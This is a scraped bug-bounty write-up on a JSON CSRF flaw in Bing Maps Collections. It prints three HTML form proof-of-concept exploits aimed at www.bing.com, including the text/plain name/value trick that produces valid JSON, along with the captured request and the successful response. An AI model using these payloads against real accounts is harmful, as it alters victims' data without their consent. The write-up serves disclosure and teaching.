---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-02-09_json-csrf-in-microsoft-bing-maps-collections.md
original_filename: 2024-02-09_json-csrf-in-microsoft-bing-maps-collections.md
title: JSON CSRF in Microsoft Bing Maps Collections
category: documents
detected_topics:
- xss
- command-injection
- otp
- cors
- csrf
tags:
- imported
- documents
- xss
- command-injection
- otp
- cors
- csrf
language: en
raw_sha256: 9766388b9d5914ed912d31bf9df1e1d162750703c366e5929132520aeb1e594a
text_sha256: 76f769a899331244a9c7b6d0f2ac8ecc9519bb81babe093611705a8ce037bb43
ingested_at: '2026-06-28T07:32:31Z'
sensitivity: unknown
redactions_applied: true
---

# JSON CSRF in Microsoft Bing Maps Collections

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-02-09_json-csrf-in-microsoft-bing-maps-collections.md
- Source Type: markdown
- Detected Topics: xss, command-injection, otp, cors, csrf
- Ingested At: 2026-06-28T07:32:31Z
- Redactions Applied: True
- Raw SHA256: `9766388b9d5914ed912d31bf9df1e1d162750703c366e5929132520aeb1e594a`
- Text SHA256: `76f769a899331244a9c7b6d0f2ac8ecc9519bb81babe093611705a8ce037bb43`


## Content

---
title: "JSON CSRF in Microsoft Bing Maps Collections"
url: "https://infosecwriteups.com/json-csrf-in-microsoft-bing-maps-collections-74afc2b197d5"
authors: ["Jayateertha Guruprasad (@JayateerthaG)"]
programs: ["Microsoft (Bing)"]
bugs: ["JSON CSRF"]
publication_date: "2024-02-09"
added_date: "2024-02-27"
source: "pentester.land/writeups.json"
original_index: 442
scraped_via: "browseros"
---

# JSON CSRF in Microsoft Bing Maps Collections

JSON CSRF in Microsoft Bing Maps Collections
Jayateertha Guruprasad
Follow
5 min read
·
Feb 9, 2024

250

Bing Maps allows users to create a collection and add places to those collections as shown below.

Press enter or click to view image in full size

The request & response to create a collection is as follows —

Press enter or click to view image in full size
Request & Response for Creation of Bing Maps Collection

You can notice that, there are no CSRF tokens present in the request, also notice that the Method & the Content-Type are POST & text/plain respectively. As this is a simple HTTP request, we are saved from preflight request & CORS checks.

Okay, so let’s craft the exploit it should be a easy one without any difficulties right ?

Let’s check the below Exploit 1 and capture in Burp —

<html>
  <body>
  <form method="POST" action="https://www.bing.com/CloudGraph/Collection/v1" enctype="text/plain">
  <input type="hidden" name='' value='{"RequestType":5,"RequestOrigin":"BingMapsVertical","SchemaVersion":"1.0","ClientETag":"0","CollectionToBeWritten":{"$type":"GeoAnnotationsCollection","Name":"Test Collection","Description":"Test Description","CanShare":false,"Items":[],"AlwaysShowPOI":true,"CopyAllowed":true,"DisplayOrder":1,"DateCreated":638421423185170000,"DateModified":638421423185170000,"DateAccessed":638421423185170000,"Properties":{"ImageUrls":"[]"},"CollectionId":"0","ItemsCount":0}}'/>
  <input type="submit" value="Submit">
  </form>
  </body>
<html>
Press enter or click to view image in full size
Exploit 1 Request

You can notice that when name attribute of input element is empty, browser won’t send any params even if value attribute has some value, Why did I keep name param empty in the first place ? -> if name=”a”, for example browser would send param like — a={“RequestType”:5,”RequestOrigin”:”BingMapsVertical”,”SchemaVersion”:”1.0",”ClientETag”:”0",”CollectionToBeWritten”:{“$type”:”GeoAnnotationsCollection”,”Name”:”Test Collection”,”Description”:”Test Description”,”CanShare”:false,”Items”:[],”AlwaysShowPOI”:true,”CopyAllowed”:true,”DisplayOrder”:1,”DateCreated”:638421423185170000,”DateModified”:638421423185170000,”DateAccessed”:638421423185170000,”Properties”:{“ImageUrls”:”[]”},”CollectionId”:”0",”ItemsCount”:0}} , which is a invalid JSON.

Okay, now what if we keep name attribute of input element as JSON body & leave value attribute empty, let’s try that now as our Exploit 2 —

<html>
  <body>
  <form method="POST" action="https://www.bing.com/CloudGraph/Collection/v1" enctype="text/plain">
  <input type="hidden" name='{"RequestType":5,"RequestOrigin":"BingMapsVertical","SchemaVersion":"1.0","ClientETag":"0","CollectionToBeWritten":{"$type":"GeoAnnotationsCollection","Name":"Test Collection","Description":"Test Description","CanShare":false,"Items":[],"AlwaysShowPOI":true,"CopyAllowed":true,"DisplayOrder":1,"DateCreated":638421423185170000,"DateModified":638421423185170000,"DateAccessed":638421423185170000,"Properties":{"ImageUrls":"[]"},"CollectionId":"0","ItemsCount":0}}' value=''/>
  <input type="submit" value="Submit">
  </form>
  </body>
<html>
Press enter or click to view image in full size
Exploit 2 Request & Response

Now, we see that we partially succeeded, we are able to send a JSON request in body, but why did it fail ?

Get Jayateertha Guruprasad’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Take a closer look at Exploit 2 request, even though we left value as empty in input element of our exploit, “=” is appended to the JSON body automatically by the browser. The backend when it tries to parse the JSON would see “=” in the end of JSON and fail to parse the improper JSON giving BAD REQUEST as the status.

So, as the params are sent in JSON, We can’t Exploit ?
What if the server is not validating JSON input structure correctly, does it accept additional params like {“foo”:”test”} ?

Let’s try to craft Exploit 3, assuming the server is not validating JSON structure properly —

<html>
  <body>
  <form method="POST" action="https://www.bing.com/CloudGraph/Collection/v1" enctype="text/plain">
  <input type="hidden" name='{"RequestType":5,"RequestOrigin":"BingMapsVertical","SchemaVersion":"1.0","ClientETag":"0","CollectionToBeWritten":{"$type":"GeoAnnotationsCollection","Name":"test csrf","Description":"test","CanShare":false,"Items":[],"AlwaysShowPOI":true,"CopyAllowed":true,"DisplayOrder":1,"DateCreated":638385168551730000,"DateModified":638385168551730000,"DateAccessed":638385168551730000,"Properties":{"ImageUrls":"[]"},"CollectionId":"0","ItemsCount":0},"foo' value='":"test"}'/>
  <input type="submit" value="Submit">
  </form>
  </body>
<html>
name='{"RequestType":5,"RequestOrigin":"BingMapsVertical","SchemaVersion":"1.0","ClientETag":"0","CollectionToBeWritten":{"$type":"GeoAnnotationsCollection","Name":"test csrf","Description":"test","CanShare":false,"Items":[],"AlwaysShowPOI":true,"CopyAllowed":true,"DisplayOrder":1,"DateCreated":638385168551730000,"DateModified":638385168551730000,"DateAccessed":638385168551730000,"Properties":{"ImageUrls":"[]"},"CollectionId":"0","ItemsCount":0},"foo' value='":"test"}'

Notice that, we have appended a new param ,”foo in the name attribute, & value attribute has “:test”} . So, that when request goes it will act as if new param has been added like — {ACTUAL_JSON,“foo=”:”test”} , We have added } in the value because we didn’t close the { in the name attribute.

Now, the actual request when viewed through BURP would look like —

POST /CloudGraph/Collection/v1 HTTP/2
Host: www.bing.com
Cookie: AUTHENTICATED_COOKIE
Content-Length: 460
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Full-Version: ""
Sec-Ch-Ua-Arch: ""
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Platform-Version: ""
Sec-Ch-Ua-Model: ""
Sec-Ch-Ua-Bitness: ""
Sec-Ch-Ua-Full-Version-List: 
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: text/plain
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i

{"RequestType":5,"RequestOrigin":"BingMapsVertical","SchemaVersion":"1.0","ClientETag":"0","CollectionToBeWritten":{"$type":"GeoAnnotationsCollection","Name":"test csrf","Description":"test","CanShare":false,"Items":[],"AlwaysShowPOI":true,"CopyAllowed":true,"DisplayOrder":1,"DateCreated":638385168551730000,"DateModified":638385168551730000,"DateAccessed":638385168551730000,"Properties":{"ImageUrls":"[]"},"CollectionId":"0","ItemsCount":0},"foo=":"test"}

Giving the 200 OK response when victim opens our exploit, indicating that the collection has been successfully created in the victim account—

HTTP/2 200 OK
Cache-Control: private
Content-Length: 274
Content-Type: application/json; charset=utf-8
Vary: Accept-Encoding
P3p: CP="NON UNI COM NAV STA LOC CURa DEVa PSAa PSDa OUR IND"
X-Eventid: ***REDACTED-SUSPECT-TOKEN***Accept-Ch: Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA
Useragentreductionoptout: A7kgTC5xdZ2WIVGZEfb1hUoNuvjzOZX3VIV/BA6C18kQOOF50Q0D3oWoAm49k3BQImkujKILc7JmPysWk3CSjwUAAACMeyJvcmlnaW4iOiJodHRwczovL3d3dy5iaW5nLmNvbTo0NDMiLCJmZWF0dXJlIjoiU2VuZEZ1bGxVc2VyQWdlbnRBZnRlclJlZHVjdGlvbiIsImV4cGlyeSI6MTY4NDg4NjM5OSwiaXNTdWJkb21haW4iOnRydWUsImlzVGhpcmRQYXJ0eSI6dHJ1ZX0=
Content-Security-Policy-Report-Only: script-src https: 'strict-dynamic' 'report-sample' 'nonce-cNS9LxynUR+ClL2pzP3fsJULF3t3qVcaKz09Ble/4/8='; base-uri 'self';report-to csp-endpoint
Report-To: {"group":"csp-endpoint","max_age":86400,"endpoints":[{"url":"https://aefd.nelreports.net/api/report?cat=bingcsp"}]}
X-Msedge-Ref: Ref A: 6FDA68B62C674CEBAD67BE5815BEDA5F Ref B: MAA02EDGE0311 Ref C: 2024-01-29T11:56:05Z
Date: Mon, 29 Jan 2024 11:56:06 GMT
Set-Cookie: SENSITIVE_COOKIE; expires=Sat, 22-Feb-2025 11:56:05 GMT; path=/; HttpOnly
Set-Cookie: SENSITIVE_COOKIE; domain=.bing.com; expires=Thu, 29-Jan-2026 11:56:05 GMT; path=/; secure; SameSite=None
Alt-Svc: h3=":443"; ma=93600
X-Cdn-Traceid: 0.0e0a2c17.1706529365.7a547e

{"RequestType":5,"CollectionsMetaMap":null,"CollectionsMap":null,"ServerETag":"088ba493-bbe0-e901-0264-160db3476ee0","SchemaVersion":"1.0","ExternalUserId":"4ae96729c1bd14a1","CollectionId":"bda0fff9-5587-456b-91f8-b8e7348d9800","ItemId":null,"ItineraryMetaServerETag":null}
Press enter or click to view image in full size
Successful Exploit POC Image

I also discovered that, I could delete Victim’s collection using a different strategy & reported the video POC to the MSRC team following the usual process highlighting the Impact — Creating/Deleting other users Bing Maps Collections.

Unfortunately, This was not severe enough for Microsoft for immediate fix and thus not eligible for a bounty 😔.

Press enter or click to view image in full size

Liked my article ? Follow me on twitter (@jayateerthaG) and medium for more content about bugbounty, Infosec, cybersecurity and hacking.
